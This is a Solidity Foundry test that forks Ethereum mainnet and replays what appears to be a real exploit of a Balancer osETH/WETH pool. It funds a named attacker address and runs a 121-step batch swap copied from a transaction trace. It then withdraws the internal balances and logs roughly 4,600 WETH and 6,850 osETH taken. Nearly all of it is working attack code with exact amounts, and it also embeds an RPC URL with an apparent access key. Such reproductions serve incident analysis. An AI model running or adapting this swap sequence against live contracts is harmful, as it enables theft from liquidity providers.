// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external payable returns (int256[] memory);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerOsEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_OSETH = 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635;
    address constant osETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant osETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint8 indexIn;
        uint8 indexOut;
    }

    function testOsEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717395
        );

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("osETH (index 2):", initialBalances[2]);

        // Fund attacker with BPT tokens
        deal(osETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(osETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(osETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Deposit BPT to internal balance first
        IBalancerVault.UserBalanceOp[] memory depositOps = new IBalancerVault.UserBalanceOp[](1);
        depositOps[0] = IBalancerVault.UserBalanceOp({
            kind: IBalancerVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: IAsset(osETH_WETH_BPT),
            amount: 10000 ether,
            sender: ATTACKER,
            recipient: payable(ATTACKER)
        });
        VAULT.manageUserBalance(depositOps);
        console.log("BPT deposited to internal balance");

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: true,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[121] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 4873132999218408001625, indexIn: 1, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 6783065423678905706961, indexIn: 1, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 48731329992184080017, indexIn: 1, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 67830654236789057069, indexIn: 1, indexOut: 2 });
        swaps[4] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 487313299921840800, indexIn: 1, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 678306542367890571, indexIn: 1, indexOut: 2 });
        swaps[6] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 4873132999218408, indexIn: 1, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 6783065423678906, indexIn: 1, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 48731329992184, indexIn: 1, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 67830654236789, indexIn: 1, indexOut: 2 });
        swaps[10] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 487313299922, indexIn: 1, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 678306542367, indexIn: 1, indexOut: 2 });
        swaps[12] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 4873132999, indexIn: 1, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 6783065424, indexIn: 1, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 48731330, indexIn: 1, indexOut: 0 });
        swaps[15] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 67830654, indexIn: 1, indexOut: 2 });
        swaps[16] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 487313, indexIn: 1, indexOut: 0 });
        swaps[17] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 678307, indexIn: 1, indexOut: 2 });
        swaps[18] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 4873, indexIn: 1, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 6783, indexIn: 1, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 50, indexIn: 1, indexOut: 0 });
        swaps[21] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 69, indexIn: 1, indexOut: 2 });
        swaps[22] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 66982, indexIn: 0, indexOut: 2 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[24] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 891000, indexIn: 2, indexOut: 0 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 5165, indexIn: 0, indexOut: 2 });
        swaps[26] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[27] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 666000, indexIn: 2, indexOut: 0 });
        swaps[28] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 9016, indexIn: 0, indexOut: 2 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[30] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 495000, indexIn: 2, indexOut: 0 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 12206, indexIn: 0, indexOut: 2 });
        swaps[32] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[33] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 369000, indexIn: 2, indexOut: 0 });
        swaps[34] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17532, indexIn: 0, indexOut: 2 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[36] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 270000, indexIn: 2, indexOut: 0 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 14434, indexIn: 0, indexOut: 2 });
        swaps[38] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[39] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 198000, indexIn: 2, indexOut: 0 });
        swaps[40] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 11377, indexIn: 0, indexOut: 2 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[42] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 160000, indexIn: 2, indexOut: 0 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 22554, indexIn: 0, indexOut: 2 });
        swaps[44] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[45] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 120000, indexIn: 2, indexOut: 0 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17663, indexIn: 0, indexOut: 2 });
        swaps[47] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[48] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 89100, indexIn: 2, indexOut: 0 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 12038, indexIn: 0, indexOut: 2 });
        swaps[50] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[51] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 67500, indexIn: 2, indexOut: 0 });
        swaps[52] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 10414, indexIn: 0, indexOut: 2 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[54] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 52200, indexIn: 2, indexOut: 0 });
        swaps[55] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 9007, indexIn: 0, indexOut: 2 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[57] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 40500, indexIn: 2, indexOut: 0 });
        swaps[58] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 7867, indexIn: 0, indexOut: 2 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[60] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 31500, indexIn: 2, indexOut: 0 });
        swaps[61] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 6554, indexIn: 0, indexOut: 2 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[63] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 24300, indexIn: 2, indexOut: 0 });
        swaps[64] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 5472, indexIn: 0, indexOut: 2 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[66] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 19800, indexIn: 2, indexOut: 0 });
        swaps[67] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 4749, indexIn: 0, indexOut: 2 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[69] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 16200, indexIn: 2, indexOut: 0 });
        swaps[70] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 4397, indexIn: 0, indexOut: 2 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[72] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 12600, indexIn: 2, indexOut: 0 });
        swaps[73] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 3442, indexIn: 0, indexOut: 2 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[75] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 10800, indexIn: 2, indexOut: 0 });
        swaps[76] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 3296, indexIn: 0, indexOut: 2 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[78] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 9000, indexIn: 2, indexOut: 0 });
        swaps[79] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 2886, indexIn: 0, indexOut: 2 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[81] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 7371, indexIn: 2, indexOut: 0 });
        swaps[82] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 2286, indexIn: 0, indexOut: 2 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[84] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 6480, indexIn: 2, indexOut: 0 });
        swaps[85] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 2124, indexIn: 0, indexOut: 2 });
        swaps[86] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[87] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 6075, indexIn: 2, indexOut: 0 });
        swaps[88] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 2014, indexIn: 0, indexOut: 2 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[90] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 5589, indexIn: 2, indexOut: 0 });
        swaps[91] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1902, indexIn: 0, indexOut: 2 });
        swaps[92] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[93] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 4779, indexIn: 2, indexOut: 0 });
        swaps[94] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1730, indexIn: 0, indexOut: 2 });
        swaps[95] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[96] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 4455, indexIn: 2, indexOut: 0 });
        swaps[97] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1664, indexIn: 0, indexOut: 2 });
        swaps[98] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[99] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3969, indexIn: 2, indexOut: 0 });
        swaps[100] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1562, indexIn: 0, indexOut: 2 });
        swaps[101] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[102] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3726, indexIn: 2, indexOut: 0 });
        swaps[103] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1492, indexIn: 0, indexOut: 2 });
        swaps[104] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[105] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3645, indexIn: 2, indexOut: 0 });
        swaps[106] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1484, indexIn: 0, indexOut: 2 });
        swaps[107] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[108] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3564, indexIn: 2, indexOut: 0 });
        swaps[109] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 1444, indexIn: 0, indexOut: 2 });
        swaps[110] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH, amount: 17, indexIn: 0, indexOut: 2 });
        swaps[111] = ExactSwapData({ tokenIn: osETH, tokenOut: address(WETH), amount: 3564, indexIn: 2, indexOut: 0 });
        swaps[112] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000, indexIn: 0, indexOut: 1 });
        swaps[113] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 10000000, indexIn: 2, indexOut: 1 });
        swaps[114] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000000000, indexIn: 0, indexOut: 1 });
        swaps[115] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 10000000000000, indexIn: 2, indexOut: 1 });
        swaps[116] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000000000000000, indexIn: 0, indexOut: 1 });
        swaps[117] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 10000000000000000000, indexIn: 2, indexOut: 1 });
        swaps[118] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 10000000000000000000000, indexIn: 0, indexOut: 1 });
        swaps[119] = ExactSwapData({ tokenIn: osETH, tokenOut: osETH_WETH_BPT, amount: 941319322493191942754, indexIn: 2, indexOut: 1 });
        swaps[120] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 941319322493191942754, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        // Convert to BatchSwapStep format
        IBalancerVault.BatchSwapStep[] memory batchSwaps = new IBalancerVault.BatchSwapStep[](swaps.length);
        for (uint i = 0; i < swaps.length; i++) {
            batchSwaps[i] = IBalancerVault.BatchSwapStep({
                poolId: POOL_ID_OSETH,
                assetInIndex: swaps[i].indexIn,
                assetOutIndex: swaps[i].indexOut,
                amount: swaps[i].amount,
                userData: ""
            });
        }

        // Define assets: [WETH, BPT, osETH]
        IAsset[] memory assets = new IAsset[](3);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(osETH_WETH_BPT);
        assets[2] = IAsset(osETH);

        // Set limits
        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        // Execute batch swap
        console.log("Executing batchSwap with", swaps.length, "swaps...");
        int256[] memory assetDeltas = VAULT.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            batchSwaps,
            assets,
            funds,
            limits,
            block.timestamp + 3600
        );

        console.log("BatchSwap executed successfully!");
        console.log("Asset deltas:");
        console.log("  WETH:", uint256(-assetDeltas[0]) / 1e18, "ETH");
        console.log("  BPT:", uint256(-assetDeltas[1]) / 1e18, "ETH");
        console.log("  osETH:", uint256(-assetDeltas[2]) / 1e18, "ETH");

        // withdraw from internal balance using manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(osETH_WETH_BPT);
        internalTokens[2] = IERC20(osETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("");
        console.log("=== INTERNAL BALANCES");
        console.log("Internal WETH:", internalBalances[0] / 1e18, "ETH");
        console.log("Internal BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("Internal osETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(osETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(osETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("manageUserBalance executed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

        console.log("");
        console.log("=== FINAL STATE");
        console.log("WETH (index 0):", finalBalances[0]);
        console.log("BPT (index 1):", finalBalances[1]);
        console.log("osETH (index 2):", finalBalances[2]);

        console.log("");
        console.log("=== POOL DELTAS");
        int256 wethDelta = int256(finalBalances[0]) - int256(initialBalances[0]);
        int256 bptDelta = int256(finalBalances[1]) - int256(initialBalances[1]);
        int256 osethDelta = int256(finalBalances[2]) - int256(initialBalances[2]);
        
        console.log("WETH delta:");
        console.logInt(wethDelta);
        console.log("BPT delta:");
        console.logInt(bptDelta);
        console.log("osETH delta:");
        console.logInt(osethDelta);

        console.log("");
        console.log("=== EXTRACTED");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("BPT:", IERC20(osETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("osETH:", IERC20(osETH).balanceOf(ATTACKER) / 1e18, "ETH");

        // Expected: ~4,623 WETH + ~6,851 osETH extracted
        console.log("");
        console.log("SUCCESS!");
    }
    
}
